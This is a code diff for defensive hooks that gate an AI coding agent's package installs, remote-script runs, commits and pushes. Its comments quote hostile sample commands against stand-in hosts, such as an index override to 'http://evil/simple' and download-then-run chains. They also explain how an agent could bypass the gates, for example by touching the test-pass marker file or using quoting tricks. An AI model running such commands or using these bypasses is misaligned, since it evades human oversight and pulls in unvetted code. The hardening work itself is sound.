+      r"|(?:\\S*/)?uv\\s+pip\\s+install"
+      r"|" + _RUNNERS
+    + r"|(?:\\S*/)?(?:" + _TOOLS + r")\\s+(?:" + _VERBS + r"))(?:\\s|$)")
+# [lens A F3 residue] A package-index override redirects even an APPROVED
+# package to another server, which no package-name check can see. Tested
+# against the matched HEAD only - an assignment that is genuinely a
+# command-position prefix of an install - so prose naming the variable does
+# not block. Shell parity (_IDX_RE).
+_INDEX_OVERRIDE = re.compile(
+    r"(?:^|\\s)(?:PIP_INDEX_URL|PIP_EXTRA_INDEX_URL|PIP_FIND_LINKS"
+    r"|UV_INDEX_URL|UV_EXTRA_INDEX_URL|NPM_CONFIG_REGISTRY"
+    r"|npm_config_registry|YARN_REGISTRY|YARN_NPM_REGISTRY_SERVER"
+    r"|COMPOSER_REPOSITORIES|GOPROXY|GEM_SOURCE)=")
+# Shell separators. A line is split into segments and each is judged on its
+# own; see _scan_install_line. Parens included so `(cd sub && pip install
+# evil)` segments the same way the shell's cmd_segments does.
+_SEGMENT = re.compile(r"[;&|()]")
+# Remote-script execution: same "unapproved software arrives" class, with no
+# inspectable package name, so it is always denied (shell parity).
+# [round-4 D16/D20] Defined in the emitted prelude from lib/cmdpos.py:
+#   _PIPE_TO_SHELL   _DOWNLOADERS   _INTERPRETERS   _REMOTE_RUN   _UV_WITH
+# [lens A F9] Value-taking flags. The v2.6.0 list was seven entries long, so
+# every other value-taking flag left its argument to be read as a package
+# name and the gate blocked - naming the wrong token:
+#   pip install --index-url <url> requests
+#     -> "not in deps.md approved list: https://..."
+# The list is long but the safety does not rest on its completeness: a flag
+# consumes the following token ONLY IF that token is value-SHAPED. That
+# inversion is what makes it safe to include short flags whose meaning
+# differs by ecosystem - `npm install -f evil` and `npm install -d evil`
+# must still block `evil`, and they do, because `evil` is package-shaped.
+# Shell parity.
 _VALUE_FLAGS = frozenset({
-    "-r", "--requirement", "-e", "--editable", "-c", "--constraint",
-    "-t", "--target", "--prefix", "--root", "-d", "--dest",
+    "--no-binary", "--only-binary", "--platform", "--python-version", "--implementation",
+    "--abi", "--progress-bar", "--cache-dir", "--log", "--proxy", "--cert",
+    "--client-cert", "--trusted-host", "--config-settings", "--report",
+    "--timeout", "--retries", "--exists-action", "--upgrade-strategy",
+    "--src", "-e", "--editable", "-t", "--target", "--prefix", "--root",
+    "-d", "--dest", "--userconfig", "--globalconfig",
+    "--cache", "--workspace", "-w", "--omit", "--include",
+    "--install-strategy", "--before", "--tag", "--scope", "--access",
+    "--store-dir", "--virtual-store-dir", "--modules-folder", "--reporter",
+    "--filter", "--dir", "-C", "--manifest-path", "--features",
+    "--branch", "--rev", "--path", "-p", "--package", "--profile",
+    "--bin", "--example", "--vers", "-f",
 })
+# [round-2 review F-1357] A package-index override on the COMMAND LINE is
+# the same attack as the environment-variable spelling _INDEX_OVERRIDE
+# already refuses, and it was being SKIPPED as an ordinary flag value: `pip
+# install --index-url http://evil/simple requests` allowed while
+# `PIP_INDEX_URL=http://evil/simple pip install requests` was blocked, from
+# the same reason string in the same module. `cargo add --git <url>` is the
+# extreme case - an arbitrary source with no package name at all.
+# Consuming the value and then checking the package name proves nothing,
+# because the flag redirects even an APPROVED package.
+# `-f` is deliberately absent: it is pip's --find-links but npm's --force,
+# and blaming the wrong one gives worse advice than an ordinary value flag.
+# Shell parity.
+_SRC_OVERRIDE_REASON = (
+    "Dependency gate: a remote source override is not verifiable.\\n"
+    "'%s %s' redirects even an APPROVED package to another server. "
+    "Remove it,\\nor set the source in the project's own package-manager "
+    "config (pip.conf, .npmrc, .cargo/config.toml)."
+)
+_INDEX_FLAGS = frozenset({
+    "-i", "--index-url", "--extra-index-url", "--find-links", "--registry",
+    "--index", "--git", "--repo",
+})
+# [v2.6.2] See the shell gate's is_flag_value for the full account. The
+# first version matched `=` and `^[0-9]` and therefore swallowed real
+# package names - `7zip-bin`, `0x`, `2to3`, `evil==1.0` - as if they were
+# flag values, installing them unapproved on BOTH substrates.
+_FLAG_VALUE_SHAPE = re.compile(r"^$|://|^:|^\\.$|^\\./|^\\.\\./|^/|^~")
+# `==` `>=` `<=` `~=` `!=` `<` `>` are pip/npm PACKAGE syntax, not flag
+# values, and every one of them contains or implies `=`, so they are tested
+# first.
+_VERSION_SPEC = re.compile(r"==|>=|<=|~=|!=|<|>")
+# [round-2 review F-1313] Requires a DOT. `^[0-9.]+$` alone still swallowed
+# SINGLE-CHARACTER numeric names, and `0`, `1` and `2` are all real npm
+# registry packages: `npm install -f 0`, `npm install -p 1` and `npm i -w 2`
+# each installed unapproved on both substrates. Identical class to the
+# `7zip-bin`/`0x`/`2to3` hole the previous round fixed, narrowed by one
+# character - the third consecutive round this predicate shipped a hole.
+# Cost: a dotless flag value (`--python-version 3`) is now read as a package
+# name and named in the refusal, which is the over-match direction a
+# deny-list wants. Shell parity (is_flag_value).
+_BARE_INT = re.compile(r"^[0-9]+$")
+_BARE_VERSION = re.compile(r"^[0-9]+(?:\\.[0-9]+)+$")
+
+
+def _is_flag_value(tok, flag=""):
+    """True if `tok` could NOT be a package name and is therefore the
+    preceding flag's value. Shell parity (is_flag_value)."""
+    if _FLAG_VALUE_SHAPE.search(tok):
+        return True
+    if _VERSION_SPEC.search(tok):
+        return False
+    if "=" in tok:
+        return True
+    if _BARE_VERSION.match(tok):
+        return True
+    # [round-3 lenses A/C] A bare INTEGER after an unambiguous long flag is
+    # that flag's value (`--timeout 60`, `--retries 5`); after a one-letter
+    # flag whose meaning differs by ecosystem (`-f` is pip's --find-links
+    # and npm's --force) it is assumed to be a package name, which is what
+    # `0`, `1` and `2` actually are on npm. Shell parity (is_flag_value).
+    return bool(_BARE_INT.match(tok)) and flag.startswith("--")
 
 
 def _pkg_name(tok):
@@ -236,8 +966,36 @@ def _dependency_gate(config):
         # verb across a line break, false-blocking a legitimate commit).
         cmd = _tool_input(input_data).get("command") or ""
         blocked = ""
-        for line in cmd.splitlines() or [cmd]:
-            blocked += _scan_install_line(line, approved)
+        # [round-4 D6] ONE scan over the WHOLE command, not one per LINE.
+        # `cmd.splitlines()` ran BEFORE any quote tracking, so an unbalanced
+        # quote earlier in the command hid everything after it: each line was
+        # parsed independently, the line carrying the stray quote swallowed
+        # the rest of ITSELF, and the following lines were never reached in
+        # the same quote state the shell would be in.
+        #
+        #     echo "a<newline>b" ; pip install evilpkg     shell=2  SDK=0
+        #
+        # `_scan_install_line` already segments quote-awarely and `_CMD_OPS`
+        # already contains a newline, so passing the whole string preserves the
+        # property the old comment claimed newline-splitting was protecting
+        # (a multi-line commit message whose text merely mentions an install
+        # verb is one quoted run, and stays one segment) while removing the
+        # fail-open. The name is now a misnomer and the docstring says so.
+        for chunk in (cmd,):
+            # [v2.6.2] _scan_install_line returns (reason, names). It used
+            # to fold its three non-package refusals into the package-name
+            # string, so a piped remote script, an unverifiable requirements
+            # file and a package-index override all denied with
+            # "not in deps.md approved list: <package-index-override>" and
+            # told the operator to add that literal to deps.md - advice that
+            # cannot work, for a refusal that has nothing to do with the
+            # approved list. SEAM-CONTRACT §3.3 requires reason strings
+            # "semantically equivalent to the shell gates'", and the shell
+            # emits a distinct explanation for each of the three.
+            reason, names = _scan_install_line(chunk, approved)
+            if reason:
+                return _deny(reason)
+            blocked += names
         if blocked:
             return _deny("Dependency gate: not in deps.md approved list:"
                          + blocked
@@ -247,71 +1005,197 @@ def _dependency_gate(config):
     return dependency_gate
 
 
+_WRITE_FLAGS = frozenset({">", ">>", "-o", "--output", "-O",
+                          "--output-document"})
+
+
+def _download_then_run(cmd):
+    """Does this command download a file and then run it through an
+    interpreter? Shell parity (the gate's two-pass _dl_files walk).
+
+    Structural rather than textual: collect the paths a DOWNLOADER writes,
+    then look for an interpreter whose argument is one of them. Requiring both
+    halves is what keeps `curl -o out.json url` and `sh ./deploy.sh` allowed -
+    each is ordinary alone, and only the pair is an arrival channel.
+    """
+    written, segs = set(), _shell_segments(cmd, _CMD_OPS)
+    for seg in segs:
+        toks = seg.split()
+        if not any(t.rsplit("/", 1)[-1] in _DOWNLOADERS for t in toks):
+            continue
+        prev = ""
+        for tok in toks:
+            if prev in _WRITE_FLAGS:
+                written.add(tok.lstrip("./"))
+            if tok.startswith(">") and len(tok) > 1:
+                written.add(tok.lstrip(">").lstrip("./"))
+            prev = tok
+    if not written:
+        return False
+    for seg in segs:
+        toks = seg.split()
+        if not toks or toks[0].rsplit("/", 1)[-1] not in _INTERPRETERS:
+            continue
+        for tok in toks[1:]:
+            if tok.startswith("-"):
+                continue
+            if tok.lstrip("./") in written:
+                return True
+    return False
+
+
 def _scan_install_line(line, approved):
-    # Returns a space-prefixed string of unapproved package names on this
-    # single command line (empty if none / not an install command).
+    # Returns (reason, names): `reason` is a complete refusal message for
+    # the three cases that are NOT about the approved list (and stops the
+    # scan), `names` is a space-prefixed string of unapproved package names
+    # on this single command line. Shell parity: the shell gate prints a
+    # distinct two-line explanation for each of the three.
     norm = " " + re.sub(r"[ \\t]+", " ", line).strip() + " "
-    m = _INSTALL_VERBS.search(norm)
-    if not m:
-        return ""
-    rest = norm[m.end():]
+    # Checked on the WHOLE line and BEFORE segmenting: the pattern
+    # deliberately reads across a pipe. Shell parity.
+    if _PIPE_TO_SHELL.search(norm):
+        return ("Dependency gate: piping a downloaded script into a shell "
+                "is blocked.\\nVendor the installer, review it, then run it "
+                "explicitly.", "")
+    # [round-4 D20] DOWNLOAD-THEN-RUN. `curl url > /tmp/a.sh && sh /tmp/a.sh`
+    # is the same arrival channel with a file in the middle, and no pipe
+    # pattern can see it. Both halves are required, so an ordinary
+    # `curl -o out.json url` or an ordinary `sh ./deploy.sh` is untouched.
+    if _download_then_run(norm):
+        return ("Dependency gate: running a script this command just "
+                "downloaded is blocked.\\nVendor the installer, review it, "
+                "then run it explicitly.", "")
+    # SEGMENT FIRST, then judge each segment on its own. Searching the line
+    # for ONE install invocation failed in both directions: `.search()` found
+    # the FIRST, so `npm install requests && npm install evil` inspected only
+    # `requests` and allowed - while the shell's greedy sed found the LAST and
+    # allowed the mirror case. Neither substrate was safe on `A && B`. Making
+    # the verdict the OR over segments fixes both and is what a deny-list
+    # wants. Shell parity.
     blocked = ""
-    skip_next = False
-    for tok in rest.split():
-        if skip_next:
-            skip_next = False
+    # [round-2 review F-435 / F-401] Quote-aware, and a backtick separates.
+    # The old `_SEGMENT.split` was a bare regex over the raw string, so it
+    # broke a quoted argument into segments - `git commit -m "fix; npm
+    # install evil"` denied on this substrate while the shell (now) allows
+    # it, because that install does not run - and it did not treat a
+    # backtick substitution as a command position, so `` echo `pip install
+    # leftpad` `` was allowed while `echo $(pip install leftpad)` was denied.
+    for seg in _expand_invoker_args(_shell_segments(norm, _CMD_OPS)):
+        seg = _flatten_seg(seg)
+        seg = seg.split(" #", 1)[0]       # a trailing comment is not a command
+        # [round-4 D20] Checked per segment so the operator is told WHICH
+        # channel fired rather than being handed the approved-list reason for
+        # a refusal that has nothing to do with the approved list.
+        if _REMOTE_RUN.search(seg):
+            return ("Dependency gate: running a remote script is not "
+                    "verifiable.\\nVendor it, review it, then run it "
+                    "explicitly.", "")
+        if _UV_WITH.search(seg):
+            return ("Dependency gate: 'uv run --with' installs a package for "
+                    "the run.\\nApprove it in .claude/steering/deps.md and "
+                    "install it explicitly.", "")
+        m = _INSTALL_HEAD.match(seg)
+        if not m:
             continue
-        if tok in _VALUE_FLAGS:
-            skip_next = True
+        rest = seg[m.end():]
+        if _INDEX_OVERRIDE.search(m.group(0)):
+            return ("Dependency gate: a package-index override is not "
+                    "verifiable.\\nIt redirects even an APPROVED package to "
+                    "another server. Remove it,\\nor set the index in the "
+                    "project's own package-manager config.", "")
+        # A verb with no arguments is a lockfile restore (`npm install`), not
+        # an install of anything to approve - but that is a fact about THIS
+        # invocation, never about the line. Shell parity.
+        if not rest.strip():
             continue
-        if tok.startswith("-"):
-            continue
-        name_only = _pkg_name(tok)
-        if name_only and name_only not in approved:
-            blocked += " " + name_only
-    return blocked
+        skip_next = False
+        last_flag = ""
+        for tok in rest.split():
+            if skip_next:
+                skip_next = False
+                # [round-3 lenses A/C] A flag VALUE carrying a scheme is a
+                # remote source, whatever the flag is called. Enumerating
+                # flag NAMES is what left `-f <url>` open - `-f` is pip's
+                # --find-links and npm's --force, excluded from the name
+                # list to avoid blaming the wrong one, and that one
+                # character bypassed the entire list. Shell parity.
+                if "://" in tok:
+                    return (_SRC_OVERRIDE_REASON % (last_flag, tok), "")
+                if _is_flag_value(tok, last_flag):
+                    continue
+            if tok in ("-r", "--requirement", "-c", "--constraint"):
+                # Packages listed in a FILE are invisible to the gate;
+                # allowing them would defeat it entirely. Shell parity.
+                return ("Dependency gate: cannot verify packages listed in "
+                        "a file.\\nInstall them explicitly, or approve in "
+                        ".claude/steering/deps.md.", "")
+            last_flag = tok
+            # The `--flag=value` spelling never reaches the value branch.
+            if "=" in tok and "://" in tok.split("=", 1)[1]:
+                return (_SRC_OVERRIDE_REASON
+                        % (tok.split("=", 1)[0], tok.split("=", 1)[1]), "")
+            if tok in _INDEX_FLAGS:
+                return ("Dependency gate: a package-index override is not "
+                        "verifiable.\\nIt redirects even an APPROVED package "
+                        "to another server. Remove it,\\nor set the index in "
+                        "the project\'s own package-manager config.", "")
+            if tok in _VALUE_FLAGS:
+                skip_next = True
+                continue
+            if tok == "." or tok.startswith(("./", "/", "../")):
+                continue                  # local path install, not a registry
+            if tok.startswith("-"):
+                continue
+            name_only = _pkg_name(tok)
+            if name_only and name_only not in approved:
+                blocked += " " + name_only
+    return (None, blocked)
 
 
 def _test_gate(config):
     test_cmd = (config["commands"].get("test") or "").strip()
 
     async def test_gate(input_data, tool_use_id, context):
-        # Block `git commit` unless tests passed since the last source
-        # edit (mark file .claude/.last-test-pass, as in the shell gate).
+        # Block `git commit` unless the configured test command passes.
+        #
+        # [lens A F4] THE PASS MARKER IS GONE, on this substrate too. The
+        # gate used to skip the run when `.claude/.last-test-pass` existed
+        # and no source file was newer. That file is gitignored and
+        # agent-writable and no gate protects it, so `touch
+        # .claude/.last-test-pass` disabled the gate for the next commit.
+        # Verifying its CONTENT is not a repair: whatever the gate can
+        # compute from the tree, an agent holding a Write tool can compute
+        # and write too. The only honest fix is to have no trusted input.
+        # Removed with it: the src/-vs-lib/ staleness walk (and with it
+        # backlog I-5, which was a divergence between two caches that no
+        # longer exist).
         cmd = _tool_input(input_data).get("command") or ""
-        if "git commit" not in cmd:
+        if not _git_verb(cmd, "commit"):
             return {}
         proj = _proj()
-        mark = proj / ".claude" / ".last-test-pass"
-        stale = True
-        if mark.is_file():
-            m_mtime = mark.stat().st_mtime
-            # Source lives under src/ OR lib/ (parity with tdd_gate's
-            # source definition); a lib/-only project must still
-            # invalidate the mark on edits.
-            stale = False
-            for sub in ("src", "lib"):
-                d = proj / sub
-                if d.is_dir() and any(
-                        p.is_file() and p.stat().st_mtime > m_mtime
-                        for p in d.rglob("*")):
-                    stale = True
-                    break
-        if not stale:
-            return {}
         if not test_cmd:
             # fail-loud-on-empty-commands: parity with the shell
-            # interpolation site "echo 'TODO: commands.test unset' &&
-            # exit 1" (AC-7-2) - deny, never allow-by-omission.
+            # interpolation site "echo 'TODO: commands.test unset' >&2 &&
+            # exit 127" (AC-7-2) - deny, never allow-by-omission.
             return _deny("TODO: commands.test unset\\n"
-                         "Commit blocked: tests failing.")
+                         "Commit blocked: test command not found (exit 127)")
         rc, _, _ = await _run(test_cmd, cwd=proj, shell=True)
         if rc == 0:
-            mark.parent.mkdir(parents=True, exist_ok=True)
-            mark.touch()
             return {}
-        return _deny("Commit blocked: tests failing.")
+        if rc == 127:
+            # Parity with the shell's P2-5 branch: the toolchain being
+            # absent is not a red suite, and saying so sends the operator
+            # to debug the wrong thing.
+            return _deny("Commit blocked: test command not found (exit 127): "
+                         + test_cmd)
+        return _deny("Commit blocked: tests failing (exit %d)." % rc)
     return test_gate
+
+
+# [round-4 D4] Shell parity, verbatim: the emitted hook's case arms are
+# `*[Pp]rompt*|prompts/*|*/prompts/*`. A path that NAMES a prompt, not every
+# markdown file in the tree.
+_PROMPT_PATH = re.compile(r"[Pp]rompt|(?:^|/)prompts/")
 
 
 def _eval_gate(config):
@@ -319,13 +1203,29 @@ def _eval_gate(config):
         # Block `git push` touching prompt files unless an eval passed
         # (mark file .claude/.last-eval-pass, as in the shell gate).
         cmd = _tool_input(input_data).get("command") or ""
-        if "git push" not in cmd:
+        if not _git_verb(cmd, "push"):
             return {}
         proj = _proj()
         # Inspect the WHOLE outgoing range, not just the newest commit:
         # a push can carry many commits, and a prompt change two commits
         # back must still gate. Prefer @{u}..HEAD (what will actually be
         # pushed); fall back to HEAD~1 when no upstream is configured.
+        #
+        # [round-4 D4] THE ROOT-COMMIT FALLBACK IS NEW HERE, and it is a
+        # fail-open the shell did not have. On a shallow clone -
+        # `actions/checkout` defaults to `--depth 1` - there is no upstream
+        # and no HEAD~1, so BOTH ranges failed, `diff` stayed empty, and the
+        # gate allowed. That is the CI shape, i.e. the one that matters. The
+        # shell has always had a third `git ls-tree -r HEAD` branch; this
+        # substrate did not.
+        #
+        # Read the correction in the round-4 brief carefully, because the
+        # obvious reading is wrong: this is NOT "the shell is the complete
+        # one and the SDK should copy it". The shell only ever diffs HEAD~1
+        # and never `@{u}..HEAD`, so a push carrying two or more commits
+        # whose prompt change is not in the newest one is shell=allow /
+        # sdk=deny - a SHELL fail-open, recorded as backlog J-18. Each
+        # substrate had a range the other lacked. Both now carry both.
         diff = ""
         for rng in ("@{u}..HEAD", "HEAD~1"):
             try:
@@ -337,7 +1237,26 @@ def _eval_gate(config):
             if rc == 0:
                 diff = out
                 break
-        if not re.search(r"prompt|\\.md$", diff, re.M):
+        else:
+            # No upstream and no parent: a ROOT commit, which introduces
+            # every prompt file the repo has and was the one push this gate
+            # never inspected.
+            try:
+                rc, out, _ = await _run(
+                    ["git", "ls-tree", "-r", "--name-only", "HEAD"],
+                    cwd=proj, shell=False)
+            except OSError:
+                rc, out = 1, ""
+            if rc == 0:
+                diff = out
+        # [round-4 D4] The predicate was `prompt|\\.md$`, which makes every
+        # markdown file a prompt file. Survivable on a two-commit diff and
+        # catastrophic once the root-commit branch above feeds it the WHOLE
+        # TREE: it matches README.md and refuses every CI push. The shell
+        # narrowed this in round 3 and this substrate was left behind, so a
+        # docs-only push was shell=allow / SDK=DENY. Narrowed to paths that
+        # actually name a prompt - shell parity, same three shapes.
+        if not any(_PROMPT_PATH.search(f) for f in diff.splitlines() if f):
             return {}
         if (proj / ".claude" / ".last-eval-pass").is_file():
             return {}
@@ -346,12 +1265,29 @@ def _eval_gate(config):
     return eval_gate
 
 
+# [round-4 D11] Directories whose contents are not the project's tests:
+# vendored code, build output, tool caches, and the bootstrap install's own
+# artifacts. Shell parity - the emitted `find` prunes exactly this set.
+_TDD_PRUNE = frozenset({
+    ".git", ".claude", "node_modules", "vendor", ".venv", "venv",
+    "target", "dist", "build", "__pycache__", ".tox", ".mypy_cache",
+    "site-packages", ".next",
+})
+
+
 def _tdd_gate(config):
     async def tdd_gate(input_data, tool_use_id, context):
-        # Block a Write to source unless a matching test was edited more
-        # recently than the target. A nonexistent target denies (parity
-        # with the shell `find -newer` failing on a missing reference):
-        # the gate's contract is test-first even for new source files.
+        # Block a Write to source unless a matching test EXISTS.
+        #
+        # [round-3 lens C] This used to require a test newer than the
+        # target, and to deny when the target did not exist - which made
+        # creating any new source file impossible even with the test
+        # already written, since a file being created never exists. The
+        # only escape was to `touch` it through Bash first, i.e. the gate's
+        # sole recourse was routing around the gate. The `-newer` ordering
+        # signal was forgeable by `touch` anyway. It also searched only a
+        # hard-coded `tests/`, which Maven/Gradle, Go, Elixir and per-package
+        # monorepos can never satisfy. Shell parity (the find sweep).
         raw = _tool_input(input_data).get("file_path") or ""
         if not raw:
             return {}
@@ -366,20 +1302,49 @@ def _tdd_gate(config):
                 return {}
         else:
             rel = raw
+        # A leading `./` is the same path and must reach the same matcher.
+        # The shell twin strips it; without this the two substrates split on
+        # `./src/x.py` (shell deny, SDK allow) - a divergence introduced by
+        # the F-1393 fix itself, caught by the corpus row added with it.
+        while rel.startswith("./"):
+            rel = rel[2:]
         if not re.match(r"(src|lib)/", rel):
             return {}
         stem = os.path.basename(rel)
         stem = stem.rsplit(".", 1)[0] if "." in stem else stem
         tpath = proj / rel
-        newer = False
-        if tpath.is_file():
-            t_mtime = tpath.stat().st_mtime
-            tests_dir = proj / "tests"
-            if tests_dir.is_dir():
-                newer = any(
-                    p.is_file() and p.stat().st_mtime > t_mtime
-                    for p in tests_dir.rglob(f"*{stem}*"))
-        if not newer:
+        found = False
+        low = stem.lower()
+        for cand in proj.rglob("*"):
+            # [round-4 D11] `.git` was the ONLY pruned directory, so a test
+            # nobody wrote satisfied the gate: `node_modules/p/dist/
+            # test_zzz.js` satisfied `src/zzz.py` on both substrates, and on a
+            # pristine install `.claude/commands/spec-new.md` satisfied
+            # `src/new.py` while `.claude/hooks/spec-gate-entry.sh` satisfied
+            # `lib/a.ts` - the gate was near-vacuous out of the box, before
+            # any user code existed. Shell parity (the same pruned set).
+            #
+            # RELATIVE parts, not `cand.parts`. The absolute path includes
+            # every ancestor of the project, so the pre-existing
+            # `".git" in cand.parts` disabled this gate entirely for any
+            # project living under a directory named `.git` - and with the
+            # wider set above it would have covered `build`, `dist`, `vendor`
+            # and `.claude`, which are ordinary parent-directory names. Found
+            # by executing the fix against a project under `~/.claude/`:
+            # every candidate was pruned and every write was refused.
+            try:
+                parts = cand.relative_to(proj).parts
+            except ValueError:
+                continue
+            if _TDD_PRUNE & set(parts):
+                continue
+            if not cand.is_file() or cand == tpath:
+                continue
+            nm = cand.name.lower()
+            if low in nm and ("test" in nm or "spec" in nm):
+                found = True
+                break
+        if not found:
             return _deny(f"TDD gate: write a failing test for {stem} "
                          f"before {rel}.")
         return {}
@@ -387,19 +1352,20 @@ def _tdd_gate(config):
 
 
 def _format_lint_gate(config):
-    fmt = (config["commands"].get("format") or "").strip()
+    # [upstream P2-6] commands.format is deliberately NOT read here.
     lint = (config["commands"].get("lint") or "").strip()
 
     async def format_lint_gate(input_data, tool_use_id, context):
         # PostToolUse: non-blocking format + lint feedback, exactly like
         # the shell gate (it never denies; empty commands are no-ops,
         # mirroring the shell's interpolated `true`).
+        # [upstream P2-6] The FORMAT command is no longer run here. It is
+        # a mutating command with no file-type filter, so it reformatted
+        # files the agent never touched, project-wide, on every edit - a
+        # PostToolUse hook must not rewrite the tree behind the operator.
+        # Lint only; it reports and never mutates. Shell parity.
         proj = _proj()
         msgs = []
-        if fmt:
-            rc, _, _ = await _run(fmt, cwd=proj, shell=True, merge=True)
-            if rc != 0:
-                msgs.append("format reported issues")
         if lint:
             # merge=True mirrors the shell's `2>&1 | tail -20`: the last 20
             # lines of the CHRONOLOGICALLY interleaved stream, not stdout-
@@ -423,10 +1389,11 @@ _GATE_FACTORIES = {
     "tdd-gate": _tdd_gate,
     "format-lint-gate": _format_lint_gate,
 }
-# Event/matcher per gate - mirrors the shell suite's settings.json wiring
-# (templates.HOOK_EVENT_MAP); tests assert the two stay in sync.
+# PRIMARY event/matcher per gate - mirrors templates.HOOK_EVENT_MAP, which is
+# the shell suite's settings.json wiring. One entry per gate, exactly as the
+# shell table has, so the two can be compared for equality.
 _GATE_MATCHERS = {
-    "secrets-gate": ("PreToolUse", "Read|Write|Edit"),
+    "secrets-gate": ("PreToolUse", "Read|Write|Edit|NotebookEdit|Grep|Glob"),
     "spec-gate-commit": ("PreToolUse", "Bash"),
     "dependency-gate": ("PreToolUse", "Bash"),
     "test-gate": ("PreToolUse", "Bash"),
@@ -434,11 +1401,37 @@ _GATE_MATCHERS = {
     "tdd-gate": ("PreToolUse", "Write"),
     "format-lint-gate": ("PostToolUse", "Write|Edit"),
 }
+# ADDITIONAL registrations for a gate that must guard more than one tool
+# surface - the mirror of templates.HOOK_EXTRA_EVENTS, kept separate for the
+# same reason: the seam §7.2 tier partition is keyed on gate NAME, one entry
+# per gate, and must not be perturbed by a second matcher.
+#
+# [lens A F7] This table did not exist. settings.json registered the shell
+# secrets-gate on BOTH `Bash` and the file matchers at v2.6.0 (P0-2), while
+# the comment above claimed _GATE_MATCHERS "mirrors the shell suite's
+# settings.json wiring; tests assert the two stay in sync" - it carried only
+# the primary matcher, and the test that was supposed to assert the
+# divergence checked a symbol (`_BASH_GATES`) that has never existed in this
+# repo, so `getattr(..., {})` made it unconditionally true. Both the claim
+# and its guard were empty. tests/test_sdk_gates.py now asserts this table
+# against templates.HOOK_EXTRA_EVENTS by equality.
+_GATE_EXTRA_MATCHERS = {
+    "secrets-gate": [("PreToolUse", "Bash")],
+}
 # Command-running gates get explicit generous timeouts. At the seam
 # runtime floor (Claude Code >= 2.1.210) a PreToolUse hook timeout fails
 # CLOSED - the tool call is blocked - so a timeout is a refusal, never a
 # silent allow.
-_GATE_TIMEOUTS = {"test-gate": 600.0, "format-lint-gate": 120.0}
+# [round-4 D15] `secrets-gate: 60` was missing here while the shell's TIMEOUTS
+# emits exactly that into settings.json - an unrecorded divergence in the
+# DECLARED contract, not just in behaviour. The two substrates now declare the
+# same bound. It is not reachable on this substrate in practice (measured
+# ~0.6 ms/line against the shell's ~5.4 ms/line after the D15 fix, so 60 s
+# lands near 100,000 lines), which is the point: an unreachable bound costs
+# nothing and a missing one has to be rediscovered by whoever next compares
+# the two files.
+_GATE_TIMEOUTS = {"test-gate": 600.0, "format-lint-gate": 120.0,
+                  "secrets-gate": 60.0}
 
 
 # Canonical order of the SDK-carried gate universe (insertion order of
@@ -479,16 +1472,30 @@ def build_hooks(config: dict) -> dict:
         raise KeyError(f"build_hooks: resolved config missing {missing}")
     out: dict = {}
     for name in _enabled_gates(config):
-        event, matcher = _GATE_MATCHERS[name]
-        kwargs = {}
-        if name in _GATE_TIMEOUTS:
-            kwargs["timeout"] = _GATE_TIMEOUTS[name]
-        out.setdefault(event, []).append(HookMatcher(
-            matcher=matcher,
-            hooks=[_GATE_FACTORIES[name](config)],
-            **kwargs))
+        registrations = ([_GATE_MATCHERS[name]]
+                         + _GATE_EXTRA_MATCHERS.get(name, []))
+        for event, matcher in registrations:
+            kwargs = {}
+            if name in _GATE_TIMEOUTS:
+                kwargs["timeout"] = _GATE_TIMEOUTS[name]
+            out.setdefault(event, []).append(HookMatcher(
+                matcher=matcher,
+                hooks=[_GATE_FACTORIES[name](config)],
+                **kwargs))
     return out
 '''
+
+
+def _py(ere: str) -> str:
+    """A cmdpos alternation, respelled as a Python regex.
+
+    cmdpos writes capture groups because bash EREs have no `(?:`; Python only
+    needs them non-capturing, and `_INSTALL_HEAD` embeds `_RUNNERS` inside its
+    own group where a stray capture would renumber `m.group(0)`'s siblings.
+    One textual substitution, applied in one place, so the two dialects cannot
+    drift the way the two hand-written copies did.
+    """
+    return ere.replace("(", "(?:").replace("(?:?:", "(?:")
 
 
 def sdk_gates_module(cfg: dict) -> str:
@@ -513,9 +1520,49 @@ def sdk_gates_module(cfg: dict) -> str:
         # membership on the SEV-1 path that a live resolved config would.
         "_resolved_hooks": list(gates),
     }
+    # [round-4 D3] THE command-position model, interpolated from lib/cmdpos.py.
+    # The emitted module must stay import-standalone, so the sets are rendered
+    # into its prelude rather than imported - but they are rendered from the
+    # ONE definition the shell header is built from, so the two substrates
+    # cannot drift the way D3 records. The gate LOGIC in _STATIC_BODY stays
+    # static and syntax-checkable in isolation; only these three literals move.
+    cmdpos_prelude = (
+        "# [round-4 D3] Generated from lib/cmdpos.py - the single definition\n"
+        "# of the command-position model, shared with the shell substrate.\n"
+        "# Do not hand-edit: a second copy is what D3 was.\n"
+        "_SHELL_INVOKERS = frozenset(%r)\n"
+        "_CMD_PREFIXES = frozenset(%r)\n"
+        "_CMD_DUAL = frozenset(%r)\n\n"
+        "_CMD_PFX_RE = %r\n\n"
+        "_DOWNLOADERS = frozenset(%r)\n"
+        "_INTERPRETERS = frozenset(%r)\n"
+        "_PIPE_TO_SHELL = re.compile(%r)\n"
+        "_RUNNERS = %r\n"
+        "# [round-4 D20] The two channels that need a DISTINGUISHING token.\n"
+        "# `deno run main.ts` and `uv run python` are ordinary; blocking them\n"
+        "# is the unactionable-refusal shape this suite has shipped twice.\n"
+        "_REMOTE_RUN = re.compile(%r)\n"
+        "_UV_WITH = re.compile(%r)\n\n"
+        % (sorted(cmdpos.ALL_INVOKERS), sorted(cmdpos.ALL_PREFIXES),
+           sorted(cmdpos.DUAL),
+           _py(cmdpos.anchor_regex(space=r"\s+", nonspace=r"\S")),
+           sorted(cmdpos.DOWNLOADERS), sorted(cmdpos.INTERPRETERS),
+           _py(cmdpos.pipe_to_shell_regex(space=r"\s+", nonspace=r"\S")),
+           _py(cmdpos.runners_regex(space=r"\s+", nonspace=r"\S")),
+           r"(?:^|\s)(?:\S*/)?deno\s+run(?:\s+-\S+)*\s+\S*://",
+           r"(?:^|\s)(?:\S*/)?uv\s+run(?:\s+-\S+)*\s+--with(?:=|\s)")
+    )
     dynamic = (
-        "# The gates enabled for THIS project at emission (subset of the\n"
-        "# resolved hook set; parity with the installed shell suite).\n"
+        cmdpos_prelude
+        + "# The gates enabled for THIS project at emission.\n"
+        "#\n"
+        "# [upstream P2-2] NOT parity with the shell suite - the\n"
+        "# earlier claim of parity was false. 7 gates here; 11 in the\n"
+        "# shell suite. Shell-only, ABSENT here: ci-mirror (so\n"
+        "# `git push` is UNGATED under SDK dispatch), drift-detector,\n"
+        "# cost-log, task-done-alarm, decision-required-alarm,\n"
+        "# spec-gate-entry. The shell suite is canonical; this module\n"
+        "# is a consistent SUBSET of it.\n"
         f"GATES = {json.dumps(gates)}\n\n"
         "# Emission-time snapshot of the gate-relevant resolved config.\n"
